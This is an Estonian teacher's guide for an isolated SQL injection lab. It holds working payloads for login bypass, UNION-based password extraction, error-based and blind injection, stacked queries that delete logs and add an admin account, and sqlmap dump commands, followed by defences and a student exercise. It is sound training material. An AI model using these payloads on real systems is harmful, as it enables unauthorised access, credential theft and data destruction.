# SQL-süstimise labor — õpetaja juhend

**Kursus:** Küberturvalisus (täiskasvanud IT-õppijad)
**Teema:** Veebirakenduste turvalisus — SQL-süstimine (SQL injection, lüh *SQLi*)
**Ülesehitus:** TEOORIA → NÄIDE → DEMONSTRATSIOON → PRAKTILINE ÜLESANNE → ANALÜÜS → KAITSEMEETMED

> ⚠️ **HOIATUS.** Kõik siinsed failid on **tahtlikult haavatavad** ja mõeldud
> **ainult isoleeritud laborikeskkonnas** (Proxmox SDN VNet, ilma väljastpoolt
> ligipääsuta) õppe-eesmärgil. Ära kunagi paigalda seda avalikku võrku ega
> tootmismasinasse. Ründamist tohib harjutada **ainult selles laboris**, mitte
> võõraste süsteemide vastu — see oleks seadusega karistatav.

---

## 1. Laborikeskkond

| Masin | Roll | Märkus |
|-------|------|--------|
| **Ubuntu Server / Debian** | Ohver (sihtmasin) | Siin jookseb haavatav PHP + MariaDB veebileht |
| **Kali Linux** | Ründaja | Brauser, `curl`, `sqlmap` |
| **Windows Server 2019** | Taustakeskkond | AD/DNS/DHCP, pole rünnakuks vajalik, kuid osa laborivõrgust |

Kõik masinad on samas isoleeritud VNet-is (nt `192.168.XXX.0/24`).

**Mõisted lahti:**
- **SQL** = *Structured Query Language* — keel andmebaasi päringuteks.
- **SQLi** = *SQL injection* — ründaja sisestab veebivormi või URL-i külge SQL-koodi, mis jõuab kaitseta rakenduses otse andmebaasipäringusse ja muudab selle tähendust.
- **LAMP** = *Linux + Apache + MySQL/MariaDB + PHP* — levinud veebiserveri komplekt.
- **MariaDB** = MySQL-iga ühilduv avatud lähtekoodiga andmebaasimootor (Debian/Ubuntu vaikevalik).

---

## 2. Paigaldamine (Ubuntu/Debiani serveris)

1. Kopeeri kogu kaust `haavatav-veebileht/` ohvermasinasse (nt `scp`-ga Kalist või otse alla laadides).
2. Mine kausta ja käivita paigaldusskript juurõigustes:

   ```bash
   cd haavatav-veebileht
   sudo bash paigaldus.sh
   ```

   Skript paigaldab Apache + MariaDB + PHP, loob andmebaasi failist `andmebaas.sql`,
   kopeerib veebifailid kausta `/var/www/html/` ja väljastab lingid.

3. Kontrolli brauseris (Kalist): `http://<ubuntu-ip>/index.php`

**Käsitsi paigaldus** (kui tahad sammud lahti seletada):

```bash
sudo apt update
sudo apt install -y apache2 mariadb-server php php-mysqli libapache2-mod-php
sudo systemctl enable --now apache2 mariadb
sudo mysql < andmebaas.sql
sudo cp *.php /var/www/html/
sudo rm -f /var/www/html/index.html
sudo chown -R www-data:www-data /var/www/html
```

---

## 3. Failide ülevaade

| Fail | Mida näitab |
|------|-------------|
| `index.php` | Avaleht, toodete nimekiri (turvaline — int-teisendus) |
| `toode.php?id=1` | **HAAVATAV** — GET-parameeter `id` otse päringus (URL-põhine SQLi) |
| `login.php` | **HAAVATAV** — autentimisest möödahiilimine |
| `otsing.php?q=...` | **HAAVATAV** — otsing + `multi_query` (andmete manipuleerimine) |
| `toode_turvaline.php?id=1` | **KAITSTUD** — prepared statement + tüübiteisendus (parandatud näide) |
| `config.php` | Andmebaasiühendus |
| `andmebaas.sql` | Andmebaasi + testandmete loomine |

Iga haavatav leht kuvab all mustas kastis tegeliku SQL-päringu (`SQL: ...`), et
õppija näeks, mida ta parajasti süstib. **Päris rakenduses ei tohi päringut ega
veateateid kunagi kasutajale näidata.**

---

## 4. Rünnakunäited

Allpool on **8 ärakasutamise näidet**. Iga näite juures on eesmärk, kasutatav
sisend (payload), seletus ja oodatav tulemus. Asenda `<ip>` ohvermasina
IP-aadressiga.

> **URL-i kodeerimine.** Brauseri aadressiribal muutub tühik sageli ise `%20`-ks,
> kuid `curl`-i puhul pane kogu URL jutumärkidesse või kodeeri tühik ise `%20`-na.
> Erimärgid: tühik = `%20`, `'` = `%27`, `#` = `%23`.

---

### Näide 1 — Autentimisest möödahiilimine (login bypass)

**Eesmärk:** logida sisse admininana ilma parooli teadmata.
**Leht:** `login.php`
**Sisend vormi:**
- Kasutajanimi: `admin' -- ` (pane tähele tühikut kriipsude järel)
- Parool: `ükskõik mis`

**Mis toimub?** Päring ehitatakse kujul:

```sql
SELECT id, kasutaja, roll FROM kasutajad
WHERE kasutaja = 'admin' -- ' AND parool = '...'
```

`--` alustab SQL-kommentaari, seega parooli kontroll kommenteeritakse välja.
Alles jääb ainult `kasutaja = 'admin'`.

**Tulemus:** "Sisselogimine õnnestus! Tere, admin (roll: admin)".

**Alternatiiv (tautoloogia):** kasutajanimi `' OR '1'='1' -- ` → tingimus on alati tõene, logib sisse esimese kasutajana.

---

### Näide 2 — `OR 1=1`: kõigi ridade kuvamine

**Eesmärk:** sundida leht kuvama kõiki tooteid, mitte ainult üht.
**URL:** `http://<ip>/toode.php?id=1 OR 1=1`
(curl: `curl "http://<ip>/toode.php?id=1%20OR%201=1"`)

**Mis toimub?**

```sql
SELECT ... FROM tooted WHERE id = 1 OR 1=1
```

`1=1` on alati tõene, seega `WHERE` sobib iga reaga.

**Tulemus:** kuvatakse kõik 5 toodet. See tõestab, et `id` ei ole kaitstud.

---

### Näide 3 — Veergude arvu leidmine (`ORDER BY`)

**Eesmärk:** UNION-rünnaku ettevalmistus — kui mitu veergu päring tagastab?
**URL-id järjest:**
- `http://<ip>/toode.php?id=1 ORDER BY 5`  → töötab
- `http://<ip>/toode.php?id=1 ORDER BY 6`  → viga: *Unknown column '6' in 'order clause'*

**Analüüs:** viga tekib 6. veeru juures, seega päring tagastab **5 veergu**
(`id, nimi, kirjeldus, hind, laos`). Seda arvu on vaja järgmises näites.

---

### Näide 4 — UNION-põhine andmete lugemine (paroolide vargus)

**Eesmärk:** lugeda `tooted`-päringu kaudu välja `kasutajad`-tabeli sisu.
**URL:**
```
http://<ip>/toode.php?id=-1 UNION SELECT 1, kasutaja, parool, roll, 5 FROM kasutajad
```
curl:
```bash
curl "http://<ip>/toode.php?id=-1%20UNION%20SELECT%201,kasutaja,parool,roll,5%20FROM%20kasutajad"
```

**Mis toimub?**
- `id=-1` ei vasta ühelegi tootele → esimene päring on tühi.
- `UNION SELECT` liidab juurde teise päringu tulemuse. Veergude arv (5) peab klappima.
- Veergudesse `nimi` ja `kirjeldus` paneme `kasutaja` ja `parool`, mis kuvatakse tootekaardil.

**Tulemus:** tootekaartidel ilmuvad kasutajanimed ja paroolid, nt
`admin / SuperSalajane2019!`. **Mõisteid:** *UNION* = kahe `SELECT`-i tulemuste
ühendamine üheks tabeliks.

**Õppepunkt:** osa paroole on MD5-räsid (nt `827ccb0e...` = `12345`). Näita
õpilastele, kuidas neid veebist (räsitabelid) sekunditega murda saab → **miks
nõrk räsistamine ei päästa.**

---

### Näide 5 — Andmebaasi kaardistamine `information_schema` kaudu

**Eesmärk:** avastada, millised tabelid ja veerud andmebaasis üldse on.
**Tabelite nimed:**
```
http://<ip>/toode.php?id=-1 UNION SELECT 1, table_name, 3, 4, 5 FROM information_schema.tables WHERE table_schema=database()
```
**Veergude nimed (tabelist `kasutajad`):**
```
http://<ip>/toode.php?id=-1 UNION SELECT 1, column_name, 3, 4, 5 FROM information_schema.columns WHERE table_name='kasutajad'
```

**Mõiste:** `information_schema` on MySQL/MariaDB sisemine andmebaas, mis kirjeldab
kõiki teisi andmebaase (tabelid, veerud, tüübid). See on ründaja jaoks "kaart".

**Tulemus:** kuvatakse `kasutajad`, `tooted`, `logid` ning veerud `id, kasutaja,
parool, roll, email`. Nüüd teab ründaja täpselt, mida Näites 4 pärida.

---

### Näide 6 — Veapõhine süstimine (error-based)

**Eesmärk:** lekitada andmed otse veateatesse (kui leht veateateid kuvab).
**URL:**
```
http://<ip>/toode.php?id=1 AND extractvalue(1, concat(0x7e, (SELECT parool FROM kasutajad LIMIT 1)))
```

**Mis toimub?** `extractvalue()` ootab korrektset XPath-i. Kui sinna panna `~`
(heksades `0x7e`) + parool, tekitab MariaDB vea, mis **sisaldab parooli teksti**.

**Tulemus:** veateade kujul `XPATH syntax error: '~SuperSalajane2019!'`.

**Õppepunkt:** see tõestab, miks **veateateid ei tohi kunagi kasutajale näidata** —
need lekitavad andmeid ka siis, kui tulemust ekraanile ei trükita.

---

### Näide 7 — Andmete MANIPULEERIMINE (stacked queries)

**Eesmärk:** mitte ainult lugeda, vaid **muuta/kustutada** andmeid.
**Leht:** `otsing.php` (kasutab `multi_query`-t, mis lubab mitu lauset korraga).

**Hindade nullimine:**
```
http://<ip>/otsing.php?q=klaviatuur'; UPDATE tooted SET hind=0; -- 
```
**Logide kustutamine:**
```
http://<ip>/otsing.php?q=x'; DELETE FROM logid; -- 
```
**Uue admini lisamine:**
```
http://<ip>/otsing.php?q=x'; INSERT INTO kasutajad (kasutaja,parool,roll) VALUES ('häkker','123','admin'); -- 
```

**Mis toimub?** `;` lõpetab otsingupäringu ja alustab uut (`UPDATE`/`DELETE`/`INSERT`).
`-- ` kommenteerib ülejäänu välja.

**Tulemus:** ava `index.php` → hinnad on 0 €, või andmebaasis on uus kasutaja.
Kontrolli andmebaasist:
```bash
sudo mysql -e "SELECT * FROM pood.tooted; SELECT * FROM pood.kasutajad;"
```

**Oluline õppepunkt:** tavaline `mysqli_query()` lubab **ainult ühe lause**, seega
`toode.php`-s stacked query EI tööta. `otsing.php` kasutab tahtlikult
`multi_query()`-t, et näidata, kui ohtlik on mitme lause lubamine. Näita õpilastele
mõlemat erinevust.

---

### Näide 8 — Pime (blind) süstimine ja `sqlmap`

**Pime süstimine** tähendab, et leht ei näita tulemust ega viga, kuid ründaja saab
järeldada vastuse käitumise või viivituse järgi.

**Tõeväärtuspõhine (boolean):**
- `toode.php?id=1 AND 1=1` → toode kuvatakse (tõene)
- `toode.php?id=1 AND 1=2` → toodet ei kuvata (väär)

**Ajapõhine (time-based):**
```
http://<ip>/toode.php?id=1 AND SLEEP(5)
```
Kui leht vastab 5 sekundit hiljem, siis tingimus täitus → andmebaas on haavatav.

**Automatiseeritud rünnak Kalis (`sqlmap`):**
```bash
# Kaardista andmebaasid
sqlmap -u "http://<ip>/toode.php?id=1" --batch --dbs

# Loe tabeli "kasutajad" sisu andmebaasist "pood"
sqlmap -u "http://<ip>/toode.php?id=1" --batch -D pood -T kasutajad --dump
```

**Mõiste:** `sqlmap` on avatud lähtekoodiga tööriist, mis automatiseerib SQLi
tuvastamise ja ärakasutamise. Näitab õpilastele, kui kiiresti kaitsetu leht
"alla läheb".

---

## 5. Kaitsemeetmed (DEFENSE)

Võrdle `toode.php` (haavatav) ja `toode_turvaline.php` (kaitstud). Peamised reeglid:

1. **Ettevalmistatud päringud (prepared statements) + parameetrite sidumine.**
   Kasutaja sisend jääb alati *andmeks*, mitte käsuks:
   ```php
   $stmt = mysqli_prepare($conn, "SELECT ... WHERE id = ?");
   mysqli_stmt_bind_param($stmt, 'i', $id);
   ```
2. **Sisendi valideerimine ja tüübiteisendus** — oodatav täisarv teisenda kohe
   `(int)`-iks; lubatud väärtuste loend (allowlist) seal, kus valik on piiratud.
3. **Ära kunagi näita veateateid ega päringuid kasutajale** — logi need serverisse.
   PHP-s: `display_errors = Off` tootmises.
4. **Vähimate õiguste põhimõte** — anna andmebaasikasutajale ainult hädavajalikud
   õigused (nt ainult `SELECT`), mitte `ALL PRIVILEGES`.
5. **Ära kasuta `multi_query`-t kasutaja sisendiga** — see lubab stacked queries.
6. **WAF ja logimine** — veebirakenduse tulemüür (*WAF, Web Application Firewall*) ja
   ebatavaliste päringute seire (laboris nt Zabbix/logianalüüs) aitavad rünnakut avastada.
7. **Paroolid korralikult räsitud** — kasuta `password_hash()` (bcrypt/argon2), mitte
   MD5-d ega avateksti.

---

## 6. Praktiline ülesanne õpilastele

1. Seadista ohvermasinas haavatav leht üles (või kasuta õpetaja oma).
2. Teosta Kalist **vähemalt 3 erinevat rünnakut** (nt login bypass, UNION,
   andmete manipuleerimine) ja tee igast ekraanipilt koos kasutatud payload'iga.
3. Kaardista `information_schema` abil andmebaasi struktuur ja kirjuta välja kõik
   tabelid ja veerud.
4. Jooksuta `sqlmap` ja dumpi `kasutajad`-tabel.
5. **Paranda** vähemalt üks haavatav leht (`toode.php`) prepared statement'i abil
   ja tõesta, et sama rünnak enam ei tööta.
6. Kirjuta lühike analüüs: milline haavatavus oli ohtlikem ja miks; millised
   kaitsemeetmed oleksid selle ära hoidnud.

**Hindamise soovitus:** rünnakute teostus + ekraanipildid (50%), parandatud kood
(30%), analüüs (20%).
